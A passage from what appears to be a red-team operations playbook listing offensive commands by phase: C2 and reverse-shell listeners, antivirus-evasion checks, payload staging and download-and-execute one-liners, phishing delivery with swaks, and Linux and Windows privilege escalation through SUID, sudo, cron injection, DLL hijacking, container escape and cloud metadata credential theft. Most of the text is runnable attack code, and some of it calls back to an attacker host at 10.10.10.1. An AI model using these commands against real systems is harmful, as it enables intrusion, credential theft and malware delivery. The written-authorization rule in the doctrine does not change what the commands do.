msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 0.0.0.0; set LPORT 443; set HttpUserAgent Mozilla/5.0; set ExitOnSession false; exploit -j"

# poshc2 — C2 server setup
posh-server --server-ip 10.10.10.1 --server-port 443 --bind-port 443 --uri-file /opt/PoshC2/resources/urls.txt
posh -l

# mythic-cli — Mythic C2 configuration
mythic-cli start
mythic-cli install github https://github.com/MythicAgents/apollo.git
mythic-cli install github https://github.com/MythicC2Profiles/http.git
```

---

### 12. LISTENER DEPLOYMENT
**Inputs:** `listener_type`, `bind_address`, `port`, `protocol`, `ssl_cert`
**Tools:** sliver, metasploit, socat, ncat, pwncat-cs

```bash
# sliver — multi-protocol listeners
sliver-client mtls --lhost 0.0.0.0 --lport 8888
sliver-client https --lhost 0.0.0.0 --lport 443 --cert /path/to/cert.pem --key /path/to/key.pem
sliver-client http --lhost 0.0.0.0 --lport 80

# metasploit — multi/handler listeners
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j"
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 0.0.0.0; set LPORT 443; set StagerVerifySSLCert true; exploit -j"

# ncat — versatile network listener
ncat -lvnp 4444
ncat -lvnp 443 --ssl --ssl-cert cert.pem --ssl-key key.pem
ncat -lvnp 4444 -e /bin/bash --allow 10.10.10.0/24

# socat — advanced listener with encryption
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
socat OPENSSL-LISTEN:443,cert=server.pem,reuseaddr,fork EXEC:/bin/bash
socat TCP-LISTEN:4444,reuseaddr,fork TCP:10.10.10.2:5555

# pwncat-cs — enhanced reverse shell handler
pwncat-cs -lp 4444
pwncat-cs -lp 4444 --platform linux
pwncat-cs -lp 443 --ssl --ssl-cert cert.pem
```

---

### 13. EVASION TESTING
**Inputs:** `payload_file`, `av_engine`, `detection_rules`, `sandbox_type`, `output_file`
**Tools:** yara, strings, objdump, defendercheck, threatcheck

```bash
# yara — signature-based detection testing
yara -r /usr/share/yara/rules/ payload.exe > yara_scan.txt
yara -r custom_av_rules/ payload.exe > yara_custom.txt
yara -s /path/to/rule.yar payload.bin

# threatcheck — identify detected bytes (Windows)
ThreatCheck.exe -f payload.exe -e AMSI
ThreatCheck.exe -f payload.exe -e Defender
ThreatCheck.exe -f payload.ps1 -e AMSI

# defendercheck — Windows Defender detection check
DefenderCheck.exe payload.exe

# strings — check for flagged strings
strings payload.exe | grep -iE '(mimikatz|meterpreter|cobalt|sliver|beacon|powershell|invoke|amsi)'
strings -e l payload.exe | grep -iE '(reverse|shell|exploit|payload|hack)'

# objdump — check for suspicious imports
objdump -x payload.exe | grep -iE '(VirtualAlloc|CreateRemoteThread|WriteProcessMemory|NtCreateThread|RtlCreateUserThread)'
objdump -p payload.dll | grep -i 'DLL Name'
```

---

### 14. PAYLOAD STAGING
**Inputs:** `payload_file`, `staging_url`, `staging_method`, `output_file`
**Tools:** python3 (http.server), php, curl, certutil (cmd), bitsadmin (cmd)

```bash
# python3 — HTTP staging server
python3 -m http.server 80 --directory /path/to/payloads/
python3 -m http.server 443 --directory /path/to/payloads/

# php — PHP staging server
php -S 0.0.0.0:8080 -t /path/to/payloads/

# curl — test payload download
curl -sk http://10.10.10.1/payload.exe -o /tmp/payload.exe
curl -sk https://10.10.10.1/payload.ps1 | iex

# wget — alternative download
wget http://10.10.10.1/payload.elf -O /tmp/payload -q
wget --no-check-certificate https://10.10.10.1/stager.sh -O /tmp/stager.sh

# scp — secure file transfer staging
scp payload.elf user@staging-server:/var/www/html/
scp -i key.pem payload.exe user@staging-server:/opt/payloads/

# netcat — direct payload transfer
nc -lvnp 9999 < payload.elf  # sender
nc 10.10.10.1 9999 > /tmp/payload.elf  # receiver
```

---

### 15. DELIVERY PREPARATION
**Inputs:** `payload_file`, `delivery_vector`, `target_email`, `phishing_template`, `output_file`
**Tools:** swaks, gophish (CLI), sendemail, mpack, zip

```bash
# swaks — SMTP-based payload delivery testing
swaks --to victim@target.com --from trusted@company.com --server smtp.target.com --attach payload.doc --header "Subject: Important Document" --body "Please review the attached document."
swaks --to victim@target.com --from hr@target.com --server smtp.target.com --attach report.xlsm --header "Subject: Q4 Report" --body "Attached Q4 report for review."
swaks --to victim@target.com --from it@target.com --server smtp.target.com --body "Click here: http://10.10.10.1/update" --header "Subject: Critical Update Required"

# sendemail — email delivery with attachments
sendemail -t victim@target.com -f trusted@company.com -u "Important Update" -m "See attached" -a payload.doc -s smtp.target.com:25

# zip — password-protected archive delivery
zip -e -P "infected" payload.zip payload.exe
zip -e -P "document2024" report.zip payload.docm

# mpack — MIME attachment creation
mpack -s "Quarterly Report" -d /dev/null payload.doc victim@target.com

# curl — test delivery via web
curl -sk -F "file=@payload.doc" https://upload.target.com/
curl -sk -X POST -d @phishing_page.html http://10.10.10.1:8080/upload
```

---

### 16. PAYLOAD VALIDATION
**Inputs:** `payload_file`, `expected_callback`, `test_environment`, `output_file`
**Tools:** sha256sum, file, strings, strace, tcpdump, curl

```bash
# sha256sum — payload integrity verification
sha256sum payload.exe > payload_checksum.txt
sha256sum -c payload_checksum.txt

# file — verify payload type and format
file payload.exe
file payload.elf
file payload.dll
file payload.bin

# strings — verify no unintended data leakage
strings payload.exe | wc -l
strings payload.exe | grep -ciE '(debug|test|dev|localhost|127\.0\.0\.1)'

# strace — runtime behavior validation
strace -f -e trace=network ./payload.elf 2>&1 | grep -E '(connect|sendto|recvfrom)'
strace -f -e trace=file ./payload.elf 2>&1 | grep -E '(open|write|unlink)'

# tcpdump — network callback verification
tcpdump -i eth0 -nn host 10.10.10.1 and port 4444 -w callback_capture.pcap -c 100

# curl — verify staging server serves payload correctly
curl -sk http://10.10.10.1/payload.exe -o /dev/null -w "HTTP_CODE:%{http_code} SIZE:%{size_download}\n"
curl -sk -I http://10.10.10.1/payload.exe | grep -E '(Content-Length|Content-Type)'
```

---

### Phase Rule — PAYLOAD DEVELOPMENT & DELIVERY

> **Operational doctrine.** Payload development converts vulnerability intelligence into executable action. Every artifact is purpose-built for the engagement. Operational protocol:
>
> 1. **Engagement authorization** — no payload is generated without explicit written authorization. Payload capabilities (reverse shell, meterpreter, data exfil) are scoped to engagement objectives.
> 2. **Toolchain verification** — `msfvenom`, `donut`, `sliver-client`, and all compilation toolchains are version-verified before payload generation. Cross-compilation targets match the target OS/arch exactly.
> 3. **Evasion layering** — payloads undergo minimum two obfuscation layers: encoding + packing, or custom compilation + string encryption. Signature detection testing (YARA, strings analysis) is mandatory before deployment.
> 4. **Staging discipline** — staging servers are ephemeral. Payload download links are single-use or time-limited. Staging infrastructure uses HTTPS with valid certificates. Delivery URLs are randomized.
> 5. **C2 resilience** — every implant supports at minimum two C2 channels (primary + fallback). Sleep intervals and jitter are configured per engagement stealth requirements. Kill dates are hardcoded.
> 6. **Evidence capture** — every payload artifact is hashed (SHA-256) and logged with: generation timestamp, exact command used, target OS/arch, C2 configuration, and intended delivery method.
> 7. **Safety controls** — all payloads include kill switches. No self-propagating payloads. No destructive payloads without explicit authorization. Payload execution scope is limited to authorized targets only.

---

## 05. PRIVILEGE ESCALATION

**Minimum capability count: 16**

### 1. SUID EXPLOITATION
**Inputs:** `target_host`, `current_user`, `suid_binary`, `gtfobins_ref`, `output_file`
**Tools:** find, linpeas, gtfobins (ref), strings, strace, ltrace

```bash
# find — discover SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null > suid_binaries.txt
find / -perm -2000 -type f 2>/dev/null > sgid_binaries.txt
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | xargs ls -la > suid_sgid_all.txt
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -v '/snap/'

# linpeas — automated SUID discovery and analysis
./linpeas.sh -a 2>&1 | grep -A5 "SUID"
./linpeas.sh -s 2>&1 | tee linpeas_suid.txt

# strings — analyze SUID binary behavior
strings /usr/bin/target_suid | grep -iE '(system|exec|popen|/bin|/tmp|PATH)'
strings /usr/local/bin/target_suid | grep -E '^/'

# strace — trace SUID binary system calls
strace -f /usr/bin/target_suid 2>&1 | grep -E '(execve|open|access)'
strace -e trace=process /usr/bin/target_suid 2>&1

# ltrace — trace SUID binary library calls
ltrace /usr/bin/target_suid 2>&1 | grep -iE '(system|popen|exec)'

# GTFOBins exploitation examples
/usr/bin/find . -exec /bin/sh -p \;
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
/usr/bin/vim -c ':!/bin/sh'
/usr/bin/nmap --interactive  # legacy
/usr/bin/env /bin/sh -p
/usr/bin/awk 'BEGIN {system("/bin/sh -p")}'
```

---

### 2. KERNEL EXPLOITATION
**Inputs:** `kernel_version`, `os_release`, `architecture`, `exploit_db`, `output_file`
**Tools:** linux-exploit-suggester, les2, uname, searchsploit, gcc

```bash
# uname — gather kernel information
uname -a > kernel_info.txt
cat /etc/os-release >> kernel_info.txt
cat /proc/version >> kernel_info.txt
lsb_release -a 2>/dev/null >> kernel_info.txt

# linux-exploit-suggester — automated kernel exploit suggestion
./linux-exploit-suggester.sh | tee les_out.txt
./linux-exploit-suggester.sh --kernel $(uname -r) | tee les_kernel.txt

# les2 — Linux Exploit Suggester 2
python3 linux-exploit-suggester-2.py | tee les2_out.txt
python3 linux-exploit-suggester-2.py -k $(uname -r) | tee les2_kernel.txt

# searchsploit — search for kernel exploits
searchsploit linux kernel $(uname -r | cut -d- -f1) privilege escalation
searchsploit linux kernel $(uname -r | cut -d- -f1) local
searchsploit --json linux kernel privilege escalation > searchsploit_kernel.json

# gcc — compile kernel exploits
gcc -o exploit exploit.c -static -lpthread
gcc -o dirty_cow exploit.c -pthread -lcrypt
gcc -o overlayfs exploit.c -static
```

---

### 3. CREDENTIAL HARVESTING
**Inputs:** `target_host`, `file_system_path`, `process_list`, `output_file`
**Tools:** linpeas, find, grep, strings, mimipenguin, lazagne

```bash
# find + grep — credential file discovery
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" -o -name "*.xml" 2>/dev/null | xargs grep -li -E '(pass|pwd|secret|key|token|cred)' 2>/dev/null > cred_files.txt
find / -name ".bash_history" -o -name ".zsh_history" -o -name ".mysql_history" -o -name ".psql_history" 2>/dev/null > history_files.txt
find /home -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.key" 2>/dev/null > ssh_keys.txt
grep -rli 'password\|passwd\|secret\|token\|api_key' /etc/ /opt/ /var/ 2>/dev/null > etc_creds.txt
cat /etc/shadow 2>/dev/null > shadow_dump.txt

# linpeas — automated credential hunting
./linpeas.sh -a 2>&1 | grep -A10 -i "password\|credential\|secret"

# mimipenguin — extract credentials from memory
python3 mimipenguin.py > mimipenguin_out.txt
./mimipenguin.sh > mimipenguin_sh.txt

# lazagne — multi-source credential recovery
lazagne all > lazagne_all.txt
lazagne browsers > lazagne_browsers.txt
lazagne sysadmin > lazagne_sysadmin.txt

# strings — memory and process credential extraction
strings /proc/*/environ 2>/dev/null | grep -iE '(pass|pwd|secret|key|token)' > proc_env_creds.txt
strings /proc/*/cmdline 2>/dev/null | grep -iE '(pass|pwd|secret|key|token)' > proc_cmd_creds.txt
```

---

### 4. SERVICE EXPLOITATION
**Inputs:** `service_name`, `service_version`, `config_path`, `port`, `output_file`
**Tools:** nmap, searchsploit, metasploit, systemctl, ss

```bash
# systemctl + ss — identify running services
systemctl list-units --type=service --state=running > running_services.txt
ss -tlnp > listening_ports.txt
ss -tlnp | grep -v '127.0.0.1\|::1' > external_services.txt
cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null > cron_services.txt

# nmap — local service vulnerability scanning
nmap -sV -p $(ss -tlnp | awk '{print $4}' | grep -oP '\d+$' | sort -u | tr '\n' ',') 127.0.0.1 -oA nmap_local_svc
nmap --script vuln -p $(ss -tlnp | awk '{print $4}' | grep -oP '\d+$' | sort -u | tr '\n' ',') 127.0.0.1 -oA nmap_local_vuln

# searchsploit — find service exploits
searchsploit $(systemctl list-units --type=service --state=running | awk '{print $1}' | head -20 | sed 's/.service//')
searchsploit mysql 5.7 privilege escalation
searchsploit apache 2.4 local

# metasploit — service exploitation
msfconsole -q -x "search type:exploit platform:linux; exit"
msfconsole -q -x "use exploit/linux/local/service_permissions; set SESSION 1; check; exit"

# manual service config review
cat /etc/mysql/my.cnf 2>/dev/null | grep -iE '(user|password|bind|skip-grant)'
cat /etc/postgresql/*/main/pg_hba.conf 2>/dev/null | grep -v '^#'
cat /etc/redis/redis.conf 2>/dev/null | grep -iE '(requirepass|bind)'
```

---

### 5. SUDO ABUSE
**Inputs:** `current_user`, `sudo_config`, `gtfobins_ref`, `output_file`
**Tools:** sudo, linpeas, find, gtfobins (ref), pspy

```bash
# sudo — enumerate sudo permissions
sudo -l 2>/dev/null | tee sudo_perms.txt
sudo -l -U $(whoami) 2>/dev/null
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null

# GTFOBins sudo exploitation
sudo /usr/bin/vi -c ':!/bin/bash'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
sudo /usr/bin/find /tmp -exec /bin/bash \;
sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
sudo /usr/bin/less /etc/passwd  # then type !/bin/bash
sudo /usr/bin/nmap --interactive  # then type !sh
sudo /usr/bin/env /bin/bash
sudo /usr/bin/perl -e 'exec "/bin/bash";'
sudo EDITOR=/usr/bin/vi visudo  # then :!/bin/bash
sudo /usr/bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# pspy — monitor for sudo-related processes
./pspy64 -pf -i 1000 | tee pspy_sudo.txt

# linpeas — sudo misconfiguration detection
./linpeas.sh -a 2>&1 | grep -A20 "Sudo version\|User .* may run"
```

---

### 6. CAPABILITY EXPLOITATION
**Inputs:** `binary_path`, `capability_type`, `current_user`, `output_file`
**Tools:** getcap, linpeas, capsh, python3, perl

```bash
# getcap — enumerate file capabilities
getcap -r / 2>/dev/null > capabilities.txt
getcap -r / 2>/dev/null | grep -E '(cap_setuid|cap_setgid|cap_dac_override|cap_dac_read_search|cap_net_raw|cap_net_bind_service|cap_sys_admin|cap_sys_ptrace)'

# capsh — display current process capabilities
capsh --print > current_caps.txt

# capability exploitation examples
# cap_setuid on python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# cap_setuid on perl
/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
# cap_dac_read_search on tar
/usr/bin/tar czf /tmp/shadow.tar.gz /etc/shadow && tar xzf /tmp/shadow.tar.gz -C /tmp/
# cap_sys_admin
/usr/bin/python3 -c 'import ctypes; libc=ctypes.CDLL("libc.so.6"); libc.mount(b"/dev/sda1",b"/mnt",b"ext4",0,None)'
# cap_net_raw
/usr/bin/python3 -c 'import socket; s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW); print("raw socket created")'
# cap_sys_ptrace
/usr/bin/python3 -c 'import ctypes; ctypes.CDLL("libc.so.6").ptrace(16,1,0,0)'

# linpeas — capability analysis
./linpeas.sh -a 2>&1 | grep -A5 "Files with capabilities"
```

---

### 7. CRON EXPLOITATION
**Inputs:** `cron_config`, `writable_paths`, `current_user`, `output_file`
**Tools:** pspy, find, ls, cat, crontab, linpeas

```bash
# crontab + cat — enumerate cron jobs
crontab -l 2>/dev/null > user_crontab.txt
cat /etc/crontab > system_crontab.txt
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null > cron_dirs.txt
cat /etc/cron.d/* 2>/dev/null >> all_crons.txt
cat /var/spool/cron/crontabs/* 2>/dev/null >> all_crons.txt

# pspy — real-time process monitoring for cron jobs
./pspy64 -pf -i 1000 | tee pspy_cron.txt
./pspy64 -pf -i 500 -r /tmp -r /var -r /opt | tee pspy_detailed.txt

# find — discover writable cron scripts
find /etc/cron* -writable -type f 2>/dev/null > writable_crons.txt
find / -path /proc -prune -o -name "*.sh" -writable -type f -print 2>/dev/null > writable_scripts.txt

# exploitation — inject into writable cron scripts
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/writable_cron_script.sh
echo '* * * * * root /tmp/rev.sh' >> /etc/crontab  # if writable

# wildcard injection (tar)
echo "" > "/path/to/cron_dir/--checkpoint=1"
echo "" > "/path/to/cron_dir/--checkpoint-action=exec=sh rev.sh"

# linpeas — cron analysis
./linpeas.sh -a 2>&1 | grep -A20 "Cron jobs\|crontab"
```

---

### 8. PATH HIJACKING
**Inputs:** `target_binary`, `current_path`, `writable_directories`, `output_file`
**Tools:** echo, find, strings, strace, linpeas, pspy

```bash
# echo — check current PATH
echo $PATH
echo $PATH | tr ':' '\n' > path_dirs.txt

# find — discover writable PATH directories
for dir in $(echo $PATH | tr ':' '\n'); do [ -w "$dir" ] && echo "WRITABLE: $dir"; done
find $(echo $PATH | tr ':' '\n') -writable -type d 2>/dev/null > writable_path_dirs.txt

# strings — find relative command calls in SUID binaries
strings /usr/bin/target_suid | grep -vE '^/' | grep -E '^[a-z]' > relative_calls.txt
strings /usr/local/bin/target_suid | grep -E '^(curl|wget|cat|ls|service|systemctl|ifconfig|ip|ps)'

# strace — confirm relative path usage
strace -f /usr/bin/target_suid 2>&1 | grep execve

# PATH hijacking exploitation
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/target_command
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/target_command
chmod +x /tmp/target_command
/usr/bin/target_suid  # triggers hijacked command
/tmp/rootbash -p

# pspy — monitor for PATH-dependent executions
./pspy64 -pf -i 500 | grep -iE '(CMD|PATH)' | tee pspy_path.txt

# linpeas — PATH hijacking detection
./linpeas.sh -a 2>&1 | grep -A5 "PATH"
```

---

### 9. TOKEN MANIPULATION
**Inputs:** `target_user`, `token_type`, `current_session`, `output_file`
**Tools:** incognito (meterpreter), winpeas, seatbelt, whoami, powershell

```bash
# Windows token enumeration
whoami /priv
whoami /all
whoami /groups

# WinPEAS — token and privilege enumeration
winpeas.exe quiet tokeninfo > winpeas_tokens.txt
winpeas.exe quiet userinfo > winpeas_users.txt

# Seatbelt — token enumeration
Seatbelt.exe TokenPrivileges TokenGroups > seatbelt_tokens.txt

# meterpreter incognito — token impersonation
msfconsole -q -x "sessions -i 1; load incognito; list_tokens -u; impersonate_token 'NT AUTHORITY\SYSTEM'; exit"

# PowerShell — token privilege exploitation
powershell -c "Get-Process | Where-Object {$_.ProcessName -eq 'winlogon'} | Select-Object Id"

# SeImpersonatePrivilege exploitation (PrintSpoofer/GodPotato)
PrintSpoofer.exe -i -c "cmd /c whoami"
GodPotato.exe -cmd "cmd /c whoami"
JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"
SweetPotato.exe -p cmd.exe -a "/c whoami"
```

---

### 10. REGISTRY EXPLOITATION
**Inputs:** `registry_hive`, `registry_key`, `target_value`, `output_file`
**Tools:** reg (cmd), winpeas, seatbelt, powershell, accesschk

```bash
# reg — registry enumeration for escalation paths
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /f "ImagePath" | findstr /i "unquoted"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# WinPEAS — registry escalation paths
winpeas.exe quiet applicationsinfo > winpeas_reg.txt
winpeas.exe quiet windowscreds autorun > winpeas_autorun.txt

# Seatbelt — registry security audit
Seatbelt.exe AutoRuns RegistryAutoLogon RegistryAutoRuns > seatbelt_reg.txt

# PowerShell — registry credential extraction
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select DefaultUserName,DefaultPassword"
powershell -c "Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall | Get-ItemProperty | Select DisplayName,InstallLocation"

# accesschk — check registry key permissions
accesschk.exe /accepteula -kvuqsw HKLM\SYSTEM\CurrentControlSet\Services
accesschk.exe /accepteula -kvuqsw HKLM\SOFTWARE
```

---

### 11. DLL HIJACKING
**Inputs:** `target_application`, `dll_search_order`, `writable_path`, `output_file`
**Tools:** procmon (Sysinternals - CLI export), winpeas, powershell, msfvenom, accesschk

```bash
# WinPEAS — DLL hijacking opportunity detection
winpeas.exe quiet applicationsinfo > winpeas_dll.txt

# PowerShell — find writable application directories
powershell -c "Get-ChildItem 'C:\Program Files\*' -Directory | ForEach-Object { $acl = Get-Acl $_.FullName; if ($acl.Access | Where-Object { $_.FileSystemRights -match 'Write' -and $_.IdentityReference -match 'Users' }) { $_.FullName } }"

# accesschk — check directory write permissions
accesschk.exe /accepteula -wvud "C:\Program Files\" > accesschk_progfiles.txt
accesschk.exe /accepteula -wvud "C:\Program Files (x86)\" > accesschk_progfiles86.txt

# msfvenom — generate malicious DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f dll -o hijack.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f dll -o hijack_shell.dll

# DLL hijacking exploitation
copy hijack.dll "C:\Program Files\VulnApp\missing.dll"
# restart vulnerable service
sc stop VulnService && sc start VulnService

# search for missing DLLs in services
wmic service get name,pathname | findstr /i /v "system32" | findstr /i "\.exe"
```

---

### 12. CONTAINER ESCAPE
**Inputs:** `container_runtime`, `container_id`, `mount_points`, `capabilities`, `output_file`
**Tools:** docker, crictl, nsenter, capsh, mount, linpeas

```bash
# docker — container escape enumeration
cat /proc/1/cgroup 2>/dev/null | grep -i docker
ls -la /.dockerenv 2>/dev/null
docker ps 2>/dev/null
docker images 2>/dev/null
docker inspect $(hostname) 2>/dev/null | grep -iE '(privileged|cap_add|mount|volume)'

# capsh — check container capabilities
capsh --print | grep -i cap
cat /proc/self/status | grep Cap

# mount — check for mounted docker socket
ls -la /var/run/docker.sock 2>/dev/null
mount | grep -E '(docker|cgroup|overlay)'

# privileged container escape
mount /dev/sda1 /mnt 2>/dev/null && ls /mnt/root/
nsenter --mount=/proc/1/ns/mnt -- /bin/bash
chroot /mnt /bin/bash

# docker socket escape
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run --privileged -v /:/host -it alpine chroot /host /bin/bash

# cgroup escape (CVE-2022-0492)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# linpeas — container escape detection
./linpeas.sh -a 2>&1 | grep -A20 "Container\|Docker\|Kubernetes"
```

---

### 13. CLOUD ESCALATION
**Inputs:** `cloud_provider`, `current_role`, `metadata_endpoint`, `output_file`
**Tools:** curl, awscli, gcloud, az, pmapper, enumerate-iam

```bash
# curl — cloud metadata service exploitation
curl -s http://169.254.169.254/latest/meta-data/ > aws_metadata.txt
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ > aws_role.txt
curl -sH "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ > gcp_metadata.txt
curl -sH "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" > azure_metadata.txt
curl -s http://169.254.169.254/latest/user-data > aws_userdata.txt

# awscli — AWS privilege escalation
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d'/' -f2)
aws iam list-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d'/' -f2)
aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/TARGET --policy-document file://admin_policy.json --set-as-default

# enumerate-iam — brute-force IAM permissions
python3 enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY

# pmapper — IAM privilege escalation paths
pmapper graph create
pmapper query "who can do iam:* with *"
pmapper query "preset privesc"

# gcloud — GCP privilege review
gcloud auth list
gcloud projects get-iam-policy $(gcloud config get-value project)
gcloud iam roles list --project $(gcloud config get-value project)
```

---

### 14. GROUP EXPLOITATION
**Inputs:** `current_user`, `group_membership`, `target_resource`, `output_file`
**Tools:** id, groups, find, linpeas, docker, lxc

```bash
# id + groups — enumerate group membership
id
groups
cat /etc/group | grep $(whoami)

# docker group exploitation
docker run -v /:/host -it alpine chroot /host /bin/bash
docker run --privileged -v /:/host -it alpine chroot /host /bin/bash

# lxc/lxd group exploitation
lxc init ubuntu:latest privesc -c security.privileged=true
lxc config device add privesc hostroot disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc -- /bin/bash

# disk group exploitation
debugfs /dev/sda1
df -h | grep -E '^/dev'

# adm group — read log files
find /var/log -readable -type f 2>/dev/null | head -20
cat /var/log/auth.log 2>/dev/null | grep -i password

# video group — framebuffer access
cat /dev/fb0 > /tmp/screen.raw

# find — discover group-writable files
find / -group $(id -gn) -writable -type f 2>/dev/null > group_writable.txt
find / -group docker -type f 2>/dev/null > docker_group_files.txt

# linpeas — group exploitation detection
./linpeas.sh -a 2>&1 | grep -A10 "Groups\|group"
```

---

### 15. PERMISSION AUDITING
**Inputs:** `target_directory`, `file_type`, `permission_mask`, `output_file`
**Tools:** find, ls, stat, namei, getfacl, linpeas

```bash
# find — comprehensive permission audit
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null > world_writable_files.txt
find / -writable -type d -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null > world_writable_dirs.txt
find /etc -writable -type f 2>/dev/null > writable_etc.txt
find / -perm -o+w -type f -not -path "/proc/*" 2>/dev/null | head -100 > other_writable.txt
find / -name "*.sh" -writable 2>/dev/null > writable_scripts.txt
find / -name "authorized_keys" -o -name "id_rsa" -o -name "id_ed25519" 2>/dev/null > ssh_files.txt

# ls — targeted permission checks
ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
ls -la /root/ 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null

# stat — detailed file permission analysis
stat -c '%a %U %G %n' /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null

# getfacl — ACL-based permission audit
getfacl /etc/shadow 2>/dev/null
getfacl -R /opt/ 2>/dev/null > acl_opt.txt

# namei — path permission chain analysis
namei -l /etc/shadow
namei -l /root/.ssh/id_rsa

# linpeas — comprehensive permission analysis
./linpeas.sh -a 2>&1 | grep -A20 "Permissions\|writable\|SGID\|SUID"
```

---

### 16. ESCALATION VALIDATION
**Inputs:** `escalation_method`, `target_privilege`, `evidence_directory`, `output_file`
**Tools:** id, whoami, cat, ls, bash, python3

```bash
# id + whoami — verify escalated privileges
id
whoami
id -u
groups

# proof of escalation — read protected files
cat /etc/shadow
cat /root/.ssh/id_rsa 2>/dev/null
cat /root/.bash_history 2>/dev/null
ls -la /root/

# validate root shell
bash -c 'echo "UID: $(id -u) | USER: $(whoami) | GROUPS: $(groups)"'
python3 -c 'import os; print(f"UID={os.getuid()} EUID={os.geteuid()}")'

# validate network access at elevated privilege
ss -tlnp
iptables -L -n 2>/dev/null

# capture escalation evidence
echo "=== ESCALATION PROOF ===" > escalation_proof.txt
echo "Timestamp: $(date -u)" >> escalation_proof.txt
echo "User: $(whoami)" >> escalation_proof.txt
echo "UID: $(id -u)" >> escalation_proof.txt
echo "Groups: $(groups)" >> escalation_proof.txt
echo "Hostname: $(hostname)" >> escalation_proof.txt
echo "Kernel: $(uname -a)" >> escalation_proof.txt
cat /etc/shadow | head -5 >> escalation_proof.txt
sha256sum escalation_proof.txt

# screenshot / evidence preservation
script -c "id && whoami && cat /etc/shadow | head -3" escalation_typescript.txt
```

---

### Phase Rule — PRIVILEGE ESCALATION

> **Operational doctrine.** Privilege escalation converts initial access into administrative control. Every escalation path is methodically discovered and validated. Execution protocol:
>
> 1. **Enumeration before exploitation** — full system enumeration (LinPEAS/WinPEAS) runs before any manual exploitation attempt. Automated tools identify SUID binaries, capabilities, cron jobs, writable paths, kernel version, and misconfigured services.
> 2. **Least-destructive path first** — misconfigurations (sudo, SUID, capabilities, cron wildcards) are exploited before kernel exploits. Kernel exploits carry crash risk and are a last resort.
> 3. **GTFOBins/LOLBAS validation** — every discovered SUID binary and sudo permission is cross-referenced against GTFOBins (Linux) or LOLBAS (Windows) before manual analysis.
> 4. **Token and credential awareness** — privilege escalation includes credential harvesting from memory, configuration files, environment variables, and history files. Harvested credentials feed Phase 06.
> 5. **Container and cloud context** — if the target is containerized, container escape techniques are enumerated. If cloud metadata is accessible, IAM privilege escalation paths are mapped.
> 6. **Evidence capture** — every escalation attempt logs: technique used, exact commands, before/after privilege levels, and proof (shadow file read, root shell screenshot). Failed attempts are documented equally.
> 7. **Stability requirement** — escalation methods that crash services or cause instability are flagged and require operator approval. Kernel exploits are compiled and tested offline when possible.
